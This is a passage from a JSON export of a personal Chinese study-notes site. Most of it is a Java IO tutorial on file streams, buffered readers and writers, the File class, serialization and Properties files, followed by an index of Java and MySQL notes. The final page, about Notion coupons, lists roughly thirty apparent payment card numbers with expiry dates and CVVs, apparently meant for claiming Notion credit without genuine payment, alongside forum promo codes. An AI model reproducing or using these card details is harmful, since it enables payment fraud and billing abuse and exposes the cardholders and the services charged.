(fis!=null)\n            try {\n                fis.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n    }\n}\n\n```\n\n![Untitled](../../../../assets/Untitled%202%203.png)\n\n### 输入输出流复制文件\n\n```java\nimport java.io.FileInputStream;\nimport java.io.FileNotFoundException;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class CopyTest01 {\n    public static void main(String[] args) {\n    //     输入流对象\n        FileInputStream fis=null;\n    //    输出流对象\n        FileOutputStream fos=null;\n        try {\n            fis=new FileInputStream(\"C:\\\\Users\\\\22305\\\\Downloads\\\\tiddlers.html\");//要复制的文件\n            fos=new FileOutputStream(\"C:\\\\Users\\\\22305\\\\Desktop\\\\复制的文件.html\");//复制的文件路径\n            byte[] bytes=new byte[1024*1024];//每次拷贝1MB\n            int readCount;//每次读取到的字节数\n            while ((readCount=fis.read(bytes))!=-1){\n                fos.write(bytes,0,readCount);//写入读取到的字节数\n            }\n            fos.flush();//写入文件必备的一部，刷新缓冲区，清空管道\n        } catch (FileNotFoundException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }finally {\n            if (fis!=null){\n                try {\n                    fis.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n            if (fos!=null){\n                try {\n                    fos.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}\n```\n\noutput:别问，问就是成功了的\n\n## FileReader 读取字符，字符流\n\n```java\nimport java.io.FileNotFoundException;\nimport java.io.FileReader;\nimport java.io.IOException;\n\npublic class FileReaderTest01 {\n    public static void main(String[] args) {\n        FileReader fr=null;//字符流对象\n        try {\n            fr=new FileReader(\"ioTest/src/a.txt\");\n            char[] chars=new char[4];//一次读取四个字符\n            int readCount=0;\n            while ((readCount=fr.read(chars))!=-1){\n                System.out.print(new String(chars,0,readCount));//读几个，输出几个\n            }\n\n        } catch (FileNotFoundException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }finally {\n            if (fr!=null){\n                try {\n                    fr.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}\n```\n\n![Untitled](../../../../assets/Untitled%203%203.png)\n\n## FileWriter 字符写入流\n\n```java\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class FileWriterTest01 {\n    public static void main(String[] args) {\n        FileWriter fiw=null;\n        try {\n            fiw=new FileWriter(\"ioTest/src/普通文本写入.txt\");\n//采用char数组的方式写入\nchar[] chars={'我','是','大','帅','比'};\n            fiw.write(chars);//整个写入\nfiw.write(chars,2,3);//部分写入\nfiw.write(\"\\n字符串的方式写入\");\n            fiw.flush();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }finally {\n            if (fiw!=null){\n                try {\n                    fiw.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n    }\n}\n\n```\n\n![Untitled](../../../../assets/Untitled%204%203.png)\n\n### 复制普通文本文件FileReader FileWriter\n\n```java\nimport java.io.FileNotFoundException;\nimport java.io.FileReader;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class CopyTest02 {\n    public static void main(String[] args) {\n        FileReader in=null;\n        FileWriter out=null;\n        try {\n            in=new FileReader(\"ioTest/src/普通文本写入.txt\");//被复制的普通文本文件\n            out=new FileWriter(\"ioTest/src/复制的文本文件.txt\");\n            char[] chars=new char[1024*512];//1MB\n            int readCount=0;//读取的字符数\n            //读取的字符数不小于0，就写入\n            while ((readCount=in.read(chars))!=-1){\n                out.write(chars,0,readCount);//读几个字符，就写几个字符\n            }\n            //写完之后，避免遗漏，需要flush\n            out.flush();\n        } catch (FileNotFoundException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }finally {\n            if (in!=null){\n                try {\n                    in.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n            if (out!=null){\n                try {\n                    out.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}\n```\n\n## BufferedReader 带有缓冲区的字符流\n\n`BufferedReader`的对象叫**包装流**，或者叫**处理流**\n\n传入的参数叫**节点流**\n\n### 书写注意点\n\n1. readLine()可以一次读一行，末尾的换行符不算在内，所以建议采用println\n2. **只能传字符流，不能传字节流** 末尾只能是`Reader`或者`Writer`，所以可以转换流，再传入\n3. 传入的`FileReader`参数不需要`close`，会自动`close`，只需要`close()`BufferedReader对象就好了\n\n### BufferReader使用eg\n\n```java\nimport java.io.BufferedReader;\nimport java.io.FileNotFoundException;\nimport java.io.FileReader;\nimport java.io.IOException;\n\npublic class BufferedReaderTest01 {\n    public static void main(String[] args) {\n        BufferedReader br=null;\n        FileReader in= null;\n        try {\n            in = new FileReader(\"ioTest/src/a.txt\");\n            br=new BufferedReader(in);//传入一个FileReader对象\n            String s=null;\n\n            //String readLine=br.readLine();//一次读取一行\n            while((s=br.readLine())!=null){\n                System.out.println(s);\n            }\n        } catch (FileNotFoundException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }finally {\n            if (br!=null){\n                try {\n                    br.close();\n                } catch (IOException e) {\n                    throw new RuntimeException(e);\n                }\n            }\n        }\n    }\n}\n```\n\n![Untitled](../../../../assets/Untitled%205%202.png)\n\n### BufferedReader传入的参数必须是字符流，不是就要转换成字符流\n\n```java\nimport java.io.BufferedReader;\nimport java.io.FileInputStream;\nimport java.io.InputStreamReader;\n\npublic class BufferedReaderTest02{\n    public static void main(String[] args) throws Exception{//声明了异常，就不用catch了\n        //字节流\n        FileInputStream fis=new FileInputStream(\"ioTest/src/a.txt\");\n        //通过转换流，将字节流--\u003e字符流，因为BufferedReader只能传入字符流\n        InputStreamReader in=new InputStreamReader(fis);\n        //将字符流传入到BufferedrReader作为参数\n        BufferedReader reader=new BufferedReader(in);\n        //BufferedReader reader=new BufferedReader(new InputStreamReader(new FileInputStream(\"ioTest/src/a.txt\")));//合并起来写\n        String readLine=null;//一行\n        while ((readLine=reader.readLine())!=null){\n            System.out.println(readLine);\n        }\n\t\t\t\treader.close();//关闭处理流\n\n    }\n}\n```\n\n![Untitled](../../../../assets/Untitled%206%202.png)\n\n## BufferedWriter 写入包装流\n\n```java\nimport java.io.*;\n\npublic class BufferedWriterTest01 {\n    public static void main(String[] args) throws Exception{\n//这么嵌套的长串读的时候还好，写起来真脑瘫，眼睛看瞎\nBufferedWriter out=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(\"ioTest/src/字符包装流写入.txt\")));\n//开始写\nout.write(\"我是你爸爸\\n\");\n        out.write(\"who are the most handsome person in the world?\");\n        out.write(\"\\nis me\");\n        out.flush();//清空管道\nout.close();//关闭\n}\n}\n\n```\n\n![Untitled](../../../../assets/Untitled%207%202.png)\n\n## DataInputStream和DataOutputStream\n\n### 知识点\n\n1. `DataInputStream`写入的文件不是普通文档，不能直接打开，需要通过`DataOutputStream`按照写入的方式读取\n2. 传入的参数都是字节流 `FileInputStream`或者`FileOutputSteam`\n\n```java\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\n\npublic class Test06 {\n    public static void main(String[] args) throws Exception {\n//数据专属输出流对象\nDataOutputStream dataout=new DataOutputStream(new FileOutputStream(\"ioTest/src/data.data\"));\n//写数据\nint i=123;\n        short s=153;\n        long l=23L;\n        float f=2.34F;\n        double d=3.23413541;\n        boolean b=true;\n        char c='d';\n\n//写\ndataout.writeInt(i);\n        dataout.writeShort(s);\n        dataout.writeLong(l);\n        dataout.writeDouble(d);\n        dataout.writeBoolean(b);\n        dataout.writeChar(c);\n\n        dataout.flush();//刷新\ndataout.close();//关闭包装流\n\n//数据专属输入流对象\n/*分开写\n        FileInputStream fis=new FileInputStream(\"ioTest/src/data.data\");\n        DataInputStream datain=new DataInputStream(fis);*/\n        //合并写\nDataInputStream datain=new DataInputStream(new FileInputStream(\"ioTest/src/data.data\"));\n//读取\nSystem.out.println(datain.readInt());\n        System.out.println(datain.readShort());\n        System.out.println(datain.readLong());\n        System.out.println(datain.readDouble());\n        System.out.println(datain.readBoolean());\n        System.out.println(datain.readChar());\n    }\n}\n\n```\n\n![Untitled](../../../../assets/Untitled%208%202.png)\n\n## PrintStream 标准输出流\n\n### 书写注意点\n\n1. 不需要关闭close()\n\n### 使用标准输出流，写日志文件方法，或者不输出到控制台\n\n```java\nimport java.io.FileNotFoundException;\nimport java.io.FileOutputStream;\nimport java.io.PrintStream;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\n\npublic class PrintStreamTest02 {\n    public static void main(String[] args) {\n        logger.log(\"测试日志\");\n        System.out.println(\"大帅比\");\n\n    }\n}\n\nclass logger {\n    public static void log(String s) {\n//指向的日志文件\n\nPrintStream out = null;\n        try {\n            out = new PrintStream(new FileOutputStream(\"ioTest/src/log.log\",true));//追加的方式写入\n\n//改变输出方向\nSystem.setOut(out);\n//系统当前日期时间\nDate nowDate = new Date();\n            SimpleDateFormat geshi = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss SSS\");//设置日期格式化格式\nString strnow = geshi.format(nowDate);//使用指定格式格式化当前时间\nSystem.out.println(strnow + \": \" + s);\n        } catch (FileNotFoundException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}\n```\n\n![Untitled](../../../../assets/Untitled%209%202.png)\n\n大帅比为什么会没有输出到控制台，因为`System.setOut`已经改变了输出的方式，指向了文件\n\n# `File`类\n\n包类：`java.io.File`\n\n1. 和[四大家族](IO流.md)没有关系，**不能进行文件读写**\n2. File对象代表的是**文件路径**或者是**文件**\n\n## 常用方法\n\n```java\nimport java.io.File;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\n\npublic class FileTest01 {\n    public static void main(String[] args) throws Exception {\n        File f1 = new File(\"fileTest/src/mulu\");\n        System.out.println(f1.getAbsoluteFile() + (f1.exists() ? \"   :存在\" : \"   :不存在\"));\n        //如果不存在就创建这个文件\n        if (!f1.exists()) {\n            //f1.createNewFile();//创建文件\n            f1.mkdir();//创建目录\n            System.out.println(f1.getAbsoluteFile() + (f1.exists() ? \"   :存在\" : \"   :不存在\"));\n        }\n\n        //    创建多级目录\n        File f2 = new File(\"D:/a/b/c/d/e/f\");\n        if (!f2.exists()) {\n\n            f2.mkdirs ();\n            System.out.println(\"f2\" + f2.exists());\n        }\n\n        //    常用方法的使用\n        File f3 = new File(\"filetest/src/Filetest01.java\");\n        //    获取文件父路径\n        String parentPath = f3.getPath();\n        System.out.println(\"父路径：\" + parentPath);\n        //    获取绝对路径\n        File f4 = f3.getAbsoluteFile();\n        System.out.println(f4);\n        System.out.println(f4.getParent());\n        //    获取文件或者目录名\n        System.out.println(f1.getName());\n        //    判断是否是一个文件\n        System.out.println(\"f1是文件吗？\" + f1.isFile());\n        //   判断是否是一个目录\n        System.out.println(\"f1是目录吗？\" + f1.isDirectory());\n        //    获取文件最后一次的修改时间\n        long haomiao = f3.lastModified();//获取修改时间的时间戳\n        Date time=new Date(haomiao);//转换成时间格式\n        SimpleDateFormat geshi=new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss SSS\");//格式\n        String modifiedTime=geshi.format(time);//转换格式，字符串处理\n        System.out.println(f3+\" 最后的修改时间是：\"+modifiedTime);\n        System.out.println(\"文件大小：\"+f3.length()+\"Bytes\");//获取文件大小：单位字节\n\n        //获取当前目录下的所有文件或目录\n        File f5=new File(\"fileTest\");\n        File[] files=f5.listFiles();\n        for (File f:files\n             ) {\n            System.out.println(f.getName());\n        }\n    }\n}\n```\n\n![Untitled](../../../../assets/Untitled%2010%202.png)\n\n## 拷贝目录下的所有文件\n\n这个代码目前存在的问题\n\n因为`exists`没有考虑是否是文件还是目录，所以可能存在一些拷贝的时候判断出错，导致创建文件或目录出现异常\n\n因为考虑单个文件的时候不会创建目录，而且文件有问题\n\n```java\nimport javax.print.attribute.DocAttributeSet;\nimport java.io.*;\n\npublic class CopyAllTest {\n    public static void main(String[] args) throws IOException {\n        File f1 = new File(\"C:\\\\Users\\\\22305\\\\Desktop\\\\nf2\\\\类统一化\\\\共享.md\");\n        File f2 = new File(\"C:\\\\Users\\\\22305\\\\Desktop\\\\10\");\n        copyAll(f1, f2);\n\n    }\n\n    /**\n     * 复制 一个目录下的所有文件和目录到另一个目录下\n     * @param src 源目录\n     * @param dest 目标目录\n     * @throws IOException\n     */\n    private static void copyAll(File src, File dest) throws IOException {\n        if (src.isDirectory()) {\n            //目标目录是否存在，不存在创建\n            if (!dest.exists()) {\n                dest.mkdirs();\n            }\n            String[] files = src.list();//源文件的目录\n            for (String file : files) {\n                //    创建目标File对象\n                File srcDir = new File(src, file);\n                System.out.println(\"源文件：\\t\"+srcDir);\n                File destDir = new File(dest, file);\n                System.out.println(\"后文件：\\t\"+destDir);\n                //    递归\n                copyAll(srcDir, destDir);\n            //\n\n            }\n\n            // 文件复制\n        } else {\n            FileInputStream in=new FileInputStream(src);\n            FileOutputStream out=new FileOutputStream(dest);\n            System.out.println(\"srcfile:\\t\"+src);\n            System.out.println(\"destfil:\\t\"+dest);\n            System.out.println();\n            //字节数组\n            byte[] bytes=new byte[1024];\n            int readCount=0;\n            while ((readCount=in.read(bytes))!=-1){\n                out.write(bytes,0,readCount);\n            }\n            out.flush();//清空管道\n            in.close();\n            out.close();\n        }\n    }\n\n}\n```\n\n# 序列化\n\n## 书写注意点\n\n1. **参与序列化或反序列化的对象类必须要实现`Serializable`**，*否则会出现`NotSerialzableException`异常*\n2. **建议将序列化版本号写出来**\n    \n    ```java\n    static final long serialVersionUID = -6430539691155161871L;\n    ```\n    \n3. `Serializable`是一个标志性接口，JVM会对实现了这个接口的特殊处理，会自动生成一个序列化版本号，标识这个类\n4. JVM判断一个类，是先对比类名，再对比序列化版本号\n5. 不想序列化的属性可以使用`transient`修饰 ，HashMap中就有此种属性\n\n## 图解\n\n![Untitled](../../../../assets/Untitled%2011%202.png)\n\n## 简述\n\n1. 类似于网络分片\n2. `Serialize`序列化：内存中的java对象分片放到硬盘\n3. `DeSerialize`  反序列化：分片的java对象从硬盘恢复到内存中\n\n## eg 序列化对象\n\n```java\nimport jdk.management.resource.internal.inst.SocketOutputStreamRMHooks;\n\nimport java.io.*;\n\npublic class SerializeTest01 {\n    public static void main(String[] args) throws Exception{\n//序列化\n    //    创建Student对象\n        Student s1=new Student(\"张三\",12);\n    //    序列化对象创建\n        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(\"student序列化文件\"));\n    //    序列化对象\n        oos.writeObject(s1);\n    //    因为是out，所以要记得flush 关闭管道\n        oos.flush();\n    //     关闭字节流\n        oos.close();\n//反序列化\n    //  反序列化对象\n        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(\"student序列化文件\"));\n    //    反序列化\n        Object s2=ois.readObject();\n    //    输出\n        System.out.println(s2);\n    //    关闭字节流\n        ois.close();\n\n    }\n}\nclass Student implements Serializable {//序列化必须要继承serialzable接口，否则会出现NotSerialzableException异常\n    private String name;\n    private int age;\n\n    public Student() {\n    }\n\n    public Student(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    public void setAge(int age) {\n        this.age = age;\n    }\n\n    @Override\n    public String toString() {\n        return \"name:\"+name+\",age\"+age;\n    }\n}\n```\n\n![序列化文件](../../../../assets/Untitled%2012%201.png)\n\n序列化文件\n\n![反序列化的输出](../../../../assets/Untitled%2013%201.png)\n\n反序列化的输出\n\n## 反序列化集合\n\n```java\nimport org.omg.CosNaming.NamingContextPackage.NotFoundReasonHelper;\n\nimport java.io.*;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.List;\n\npublic class SerializableTest02 {\n    public static void main(String[] args) throws Exception {\n//创建集合\nList\u003cUser\u003e userList=new ArrayList\u003c\u003e();\n//添加节点元素\nuserList.add(new User(\"zhangsan\",15));\n        userList.add(new User(\"wanghai\",46));\n        userList.add(new User(\"caixukun\",45));\n        userList.add(new User(\"mahuateng\",87));\n//创建序列化对象\nObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"序列化文件\"));\n//序列化集合对象\nout.writeObject(userList);//参与序列化的对象都要实现Serializable,User实现了的，ArrayList也继承了的09\nout.flush();\n        out.close();\n\n//反序列化\n//创玩反序列化对象\nObjectInputStream in=new ObjectInputStream(new FileInputStream(\"序列化文件\"));\n//反序列化\nObject s2=in.readObject();\n        System.out.println(s2);\n//强制转换类型\nList\u003cUser\u003e users=(List\u003cUser\u003e) s2;\n//打印输出\nfor (User u:users\n             ) {\n            System.out.println(u);\n        }\n    }\n}\n\n/**\n *用户类\n*/\nclass User implements Serializable {\n    private String name;\n    private int age;\n\n    @Override\n    public String toString() {\n        return \"User[\"+name+\"\\t\"+age+\"]\";\n    }\n\n//封装\npublic User() {\n    }\n\n    public User(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    public void setAge(int age) {\n        this.age = age;\n    }\n}\n```\n\n![Untitled](../../../../assets/Untitled%2014%201.png)\n\n# 配置文件：IO+Properties的联合应用\n\n类似于`KEY=value`的文件叫配置文件，可以通过IO+PRopertes联合应用，读取本地硬盘的配置文件，就不用一直保存在内存中，每次都需要重新运行配置\n\n比如主题文件，设置文件等等，都可以采用这样的方式\n\n## 作用\n\n将经常改变的数据，单独写到一个文件中进行读取写入\n\n一般是**配置文件**，文件后缀建议：`.properties` idea会识别这种配置文件\n\n## eg\n\n创建配置文件\n\n![Untitled](../../../../assets/Untitled%2015%201.png)\n\n敲代码读取配置文件\n\n**采用相对路径时，根目录在项目的根目录下，不是模块根**\n\n```java\nimport java.io.FileReader;\nimport java.util.Properties;\nimport java.util.Set;\n\npublic class IOpropertiesTest01 {\n    public static void main(String[] args) throws Exception{\n//新建流对象\nFileReader reader=new FileReader(\"配置.properties\");\n//新建Map属性集合\nProperties pro=new Properties();\n//使用pro的load将文件中的数据加载到Map集合中\npro.load(reader);//传入，进行写入到map\n    //读取配置文件\n//通过key来获取对应的value\nString name=pro.getProperty(\"name\");\n        System.out.println(name);\n//当然，还可以转成list等别的类型集合进行遍历\n}\n}\n\n```\n\n![Untitled](../../../../assets/Untitled%2016%201.png)","lastmodified":"2023-05-31T09:03:32.981907233Z","tags":null},"/Java":{"title":"Java","content":"\n本来挺喜欢Java的，但是就业形式严峻，跑路了。\n\n---\n- Java基础\n\t- 00理论\n\t\t- [[001_JDK、JRE、JVM的关系]]\n\t\t- [[002_Java运行与加载]]\n\t\t- [[003_环境变量]]\n\t\t- [[004_注释方法]]\n\t\t- [[005_public_class和class的区别]]\n\t- 01铺垫\n\t\t- [[010_符号定义]]\n\t\t- [[011_javadoc的使用]]\n\t\t- [[012_不同数据数类型占用大小]]\n\t\t- [[013_接收键盘输入]]\n\t\t- [[014_方法的调用]]\n\t\t- [[015_break和return的区别]]\n\t\t- [[016_方法执行时内存变化]]\n\t\t- [[017_方法重载overload]]\n\t- 02基本\n\t\t- [[021_递归]]\n\t\t- [[022_面向对象和面向过程]]\n\t\t- [[023_对象和类]]\n\t\t- [[024_对象的创建]]\n\t\t- [[025_空指针异常]]\n\t\t- [[026_方法调用时的参数传递]]\n\t- 03构造方法\n\t\t- [[031_构造方法]]\n\t\t- [[032_注意事项]]\n\t\t- [[033_构造方法举例]]\n\t\t- [[034_夫妻结婚]]\n\t- 04封装\n\t\t- [[041_封装]]\n\t\t- [[042_实例方法]]\n\t\t- [[043_书写格式]]\n\t- 05this和static关键字\n\t\t- [[051_static]]\n\t\t- [[052_静态方法和实例方法]]\n\t\t- [[053_方法定义static]]\n\t\t- [[053_空指针访问静态不会空指针]]\n\t\t- [[054_实例方法的调用]]\n\t\t- [[054实例：账户取钱]]\n\t\t- [[055_不同代码块执行顺序]]\n\t\t- [[0512_静态代码块]]\n\t\t- [[0512_static变量]]\n\t\t- [[0514_实例代码块]]\n\t\t- [[0515_静态方法和实例方法]]\n\t\t- [[0516_空指针访问静态不会空指针]]\n\t\t- [[0517_实例方法的调用]]\n\t\t- [[0518_不同代码块执行顺序]]\n\t\t- [[0521_this的内存结构]]\n\t\t- [[0521_this的内存结构]]\n\t\t- [[0522_this总结]]\n\t\t- [[0523_this例子]]\n\t\t- [[0524_变量的分布]]\n\t\t- [[0525_方法定义static]]\n\t\t- [[0525_this无参调有参构造方法]]\n\t\t- [[0526_this的内存结构]]\n\t\t- [[0529_变量的分布]]\n\t- 06继承\n\t\t- [[061_继承基本概念]]\n\t\t- [[062_super关键字]]\n\t\t- [[063_什么时候可以使用继承]]\n\t- 07方法覆盖和多态\n\t\t- [[0711_方法覆盖override]]\n\t\t- [[0712_覆盖eg]]\n\t\t- [[0713_方法覆盖经典例子]]\n\t\t- [[0714_例子toString方法覆盖]]\n\t\t- [[0721_多态]]\n\t\t- [[0722_多态举例]]\n\t\t- [[0723_向下转型]]\n\t\t- [[0724_instanceof运算符]]\n\t\t- [[0725_多态例子a主人喂宠物]]\n\t\t- [[0726_宠物养猫优化]]\n\t- 08遗留问题\n\t\t- [[081_静态方法不存在方法覆盖]]\n\t\t- [[082_私有方法无法覆盖]]\n\t\t- [[083_关于方法覆盖时的返回值类型]]\n\t- 09super\n\t\t- [[091_suepr关键字]]\n\t\t- [[092_构造方法执行顺序]]\n\t\t- [[093_使用super调用父类方法]]\n\t- 10总结\n\t\t- [[101_学习总结]]\n- Java进阶\n\t- 11Idea的使用\n\t\t- [[111_Idea的基本使用]]\n\t\t- [[112_java相关帮助文档]]\n\t- 12final关键字\n\t\t- [[121_final]]\n\t\t- [[122_final修饰的引用型变量]]\n\t\t- [[123_final修饰实例变量]]\n\t- 13抽象类abstract\n\t\t- [[131_抽象类]]\n\t\t- [[132_抽象方法]]\n\t\t- [[133_例子]]\n\t\t- [[134_面试题]]\n\t- 14接口interface\n\t\t- [[141_接口]]\n\t\t- [[142_接口eg1]]\n\t\t- [[143_一个类实现多个接口]]\n\t\t- [[144_extends和implements同时出现]]\n\t\t- [[145_接口在开发中的作用]]\n\t\t- [[146_is_a、has_a、like_a]]\n\t\t- [[147_抽象类和接口的区别]]\n\t\t- [[148_接口实现eg2厨师炒菜]]\n\t- 15package和import机制\n\t\t[[151_package]]\n\t\t- [[152_import机制的使用]]\n\t- 16访问控制权限\n\t\t- [[161_访问控制权限]]\n\t- 17根类Object\n\t\t- [[171_Object类中的常用方法]]\n\t\t- [[172_重写equals方法eg]]\n\t- 18匿名内部类\n\t\t- [[181_匿名内部类]]\n\t\t- [[182_匿名内部类eg]]\n\t- 19数组\n\t\t- [[191_数组]]\n\t\t- [[192_main方法上面的String_args]]\n\t\t- [[193_引用数据类型数组]]\n\t\t- [[194_数组扩容]]\n\t\t- [[195_二维数组]]\n\t\t- [[196_eg1_模拟压栈]]\n\t\t- [[197_eg2_酒店]]\n\t- 20排序\n\t\t- [[201_排序与查找]]\n\t\t- [[202_冒泡排序方法]]\n\t\t- [[203_选择排序]]\n\t\t- [[204_顺序查找]]\n\t\t- [[205_二分查找]]\n\t\t- [[207_数组工具类java_util_Arrays]]\n\t- 21常用类的使用\n\t\t- [[2111_String类]]\n\t\t- [[2112_String常用方法]]\n\t\t- [[2113_字符串拼接StringBuffer]]\n\t\t- [[2114_字符串拼接StringBuilder]]\n\t\t- [[2115_八种包装类型Integer等等]]\n\t\t- [[2116_String_int_Integer之间的相互转换]]\n\t\t- [[2121_java对日期的处理]]\n\t\t- [[2131_关于数字的格式化]]\n\t- 22异常处理\n\t\t- [[221_异常]]\n\t\t- [[222_UML_统一建模语言]]\n\t\t- [[223_异常的继承结构]]\n\t\t- [[224_异常处理的原理]]\n\t\t- [[225_异常对象的常用方法]]\n\t\t- [[226_finally语句]]\n\t\t- [[227_finally面试题]]\n\t\t- [[228_final,finally,finalize()的区别]]\n\t\t- [[229_如何自定义异常(自己编写异常)]]\n\t\t- [[2291_异常实际例子]]\n\t\t- [[2292_继承的方法覆盖和异常]]\n\t- 23集合\n\t\t- [[2301_集合list概述]]\n\t\t- [[2302集合继承结构图1_Collection]]\n\t\t- [[2303集合继承结构图2_Map]]\n\t\t- [[2304_Collection中常用的方法]]\n\t\t- [[2305_Collection迭代器的使用Iterator]]\n\t\t- [[2306__Collection的contains]]\n\t\t- [[2307_remove方法]]\n\t\t- [[2308_List特有的方法]]\n\t\t- [[2309_ArrayList和Vector]]\n\t\t- [[2310_LinkedList双向链表]]\n\t\t- [[2311_LinkedList]]\n\t\t- [[2311_Vector]]\n\t\t- [[2312_HashSet和TreeSet]]\n\t\t- [[2313_Map接口的常用方法]]\n\t\t- [[2314_Map的两种遍历方式]]\n\t\t- [[2315_HashMap]]\n\t\t- [[2316_HashSet重写equals和hashCode方法]]\n\t\t- [[2317_HashMap和HashTable的区别]]\n\t\t- [[2318_Hashtable的Properties属性类]]\n\t\t- [[2319_TreeSet关于排序：实现comparable接口或使用比较器Compartor]]\n\t\t- [[2320_自平衡二叉树数据结构]]\n\t\t- [[2321_Collections工具类]]\n\t- 24泛型\n\t\t- [[241_泛型]]\n\t\t- [[242_泛型方法的使用]]\n\t- 25foreach\n\t\t- [[25_foreach]]\n\t- 26IO流\n\t\t- [[IO流]]\n\t- 27多线程\n\t\t- [[多线程]]\n\t- 28反射机制\n\t\t- [[2801_反射机制]]\n\t\t- [[2802_反射机制补充]]\n\t- 29类加载器\n\t\t- [[类加载器]]\n\t- 30路径的移植性问题\n\t\t- [[路径的移植性问题]]\n\t- 31注解\n\t\t- [[3101_注解]]\n\t\t- [[3102_注解补充]]\n\t- 32补充\n\t\t- [[3201_单例设计模式【补充】]]\n\t\t- [[3202_Calendar日历类使用【补充】]]\n\t\t- [[3203_正则表达式]]\n\t\t- [[3203_Lambda表达式]]\n\t\t- [[3204_二叉树、平衡二叉树、红黑树]]\n\t\t- [[3205_日志技术]]\n\t\t- [[3206_IO流的补充]]\n\t\t- [[3207_喝酒与瓶子的问题]]\n\t- 33单元测试\n\t\t- [[3301_单元测试]]\n\t- 34动态代理\n\t\t- [[3401_动态代理]]\n- 存在的问题\n\t- [[手写代码问题]]\n\t- [[手写单向链表结构]]\n\t- [[手写学生信息系统]]\n- java作业\n\t- [[day24_武器作业问题总结]]\n- JDBC\n\t- [[0000_总结基本要点]]\n\t- [[0001_JDBC基本概念]]\n\t- [[0002_JDBC开发基本使用]]\n\t- [[0003_JDBC开发6步]]\n\t- [[0004_Statement和PreparedStatement的区别]]\n\t- [[0005_JDBC案例：给SQL数据库插入数据]]\n\t- [[0006_采用`Class.forName`方式注册驱动]]\n\t- [[0007_通过资源绑定器获取属性文件]]\n\t- [[0008_完成第五步，处理结果集]]\n\t- [[0009_案例：连接数据库，验证用户登录(可被sql注入）]]\n\t- [[0010_解决sql注入问题的PreparedStatement]]\n\t- [[0011_事务机制]]\n\t- [[0012_JBMC封装类]]\n\t- [[0013_MySQL数据库相关的基本使用]]\n\t- [[0014_悲观锁（行级锁）以及乐观锁基本认识]]\n- Java项目\n\t- [[【项目1】图书管理系统]]\n\t- [[【项目2】多线程下载器步骤]]\n\t- [[【项目3】电影票购票系统]]\n- MySQL\n\t- [[0001_概述]]\n\t- [[0002_SQL语句的分类]]\n\t- [[0003_mysql基本命令使用]]\n\t- [[0004_查询语句相关]]\n\t- [[0005_连接]]\n\t- [[0006__嵌套子查询]]\n\t- [[0007_union]]\n\t- [[0008_limit]]\n\t- [[0009_DML（数据操作语言）]]\n\t- [[0010_约束(Constraint)]]\n\t- [[0011_存储引擎]]\n\t- [[0012_事务]]\n\t- [[0013_索引]]\n\t- [[0014视图(view)]]\n\t- [[0015_DBA命令]]\n\t- [[0016_数据库设计三范式]]\n\t- [[0017_一对一怎么设计？]]\n\t- [[0018_MySQL修改root密码]]\n\n-  其他\n\t- [[java学习路程]]","lastmodified":"2023-05-31T09:03:32.981907233Z","tags":null},"/Notion%E4%BC%98%E6%83%A0%E5%88%B8":{"title":"Notion优惠券","content":"\n\n## 虚拟 visa 卡号\n```\n   wojff\n  4859530124962218 07 2024 167\n  4061565802604488 03/29 037\n  ```\n```\n  5154620020122451|07|2027|153\n  5154620020437842|02|2027|478\n  5154620020488845|08|2026|717\n  5154620020885768|02|2027|269\n  5154620020335574|04|2023|963\n  5154620020318828|04|2026|656\n  5154620020826705|09|2027|561\n  5154620020304844|07|2027|421\n  5154620020282545|08|2023|311\n  5154620020653786|02|2023|359\n  \n  5154620020820328|01|2026|952\n  5154620020772362|08|2024|858\n  5154620020782510|12|2026|628\n  5154620020231062|08|2026|784\n  5154620020180848|03|2023|738\n  5154620020738108|10|2027|236\n  5154620020607808|12|2026|660\n  5154620020206478|07|2024|441\n  5154620020445761|05|2026|415\n  5154620020720858|07|2027|731\n  \n  \n  5154620020006035|11|2026|451\n  5154620020571467|02|2025|576\n  5154620020055552|05|2025|411\n  5154620020185433|09|2024|687\n  5154620020004386|12|2023|403\n  5154620020011175|10|2023|531\n  5154620020157325|01|2026|641\n  5154620020040232|11|2024|370\n  5154620020160212|12|2024|804\n  5154620020288005|02|2023|686\n  ```\n## notion 优惠码\n[Notion送36年会员 ($1750)-美国VPS综合讨论-全球主机交流论坛 Powered by Discuz! (hostloc.com)](https://hostloc.com/thread-899198-1-1.html)\n```\n  ADALOVELACE\n  500刀\n  \n  STARTUP1000P666\n    1000刀\n  升级为team账号，然后输入第三个优惠码\n  HAPPYHOUR\n  250刀\n  \n  STARTUP1000P453\n  最新的1000刀\n  \n  HAPPYHOUR 送 250刀\n  